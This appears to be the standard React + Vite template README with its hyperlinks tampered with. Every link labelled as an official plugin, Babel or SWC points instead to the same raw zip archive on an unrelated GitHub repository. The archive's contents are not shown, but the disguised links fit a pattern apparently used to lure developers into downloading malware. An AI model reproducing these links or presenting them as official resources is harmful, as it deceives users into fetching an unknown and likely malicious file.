# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/hivefivetech/python-oops/raw/refs/heads/master/public/oops_python_wolfkin.zip) uses [Babel](https://github.com/hivefivetech/python-oops/raw/refs/heads/master/public/oops_python_wolfkin.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/hivefivetech/python-oops/raw/refs/heads/master/public/oops_python_wolfkin.zip) uses [SWC](https://github.com/hivefivetech/python-oops/raw/refs/heads/master/public/oops_python_wolfkin.zip) for Fast Refresh
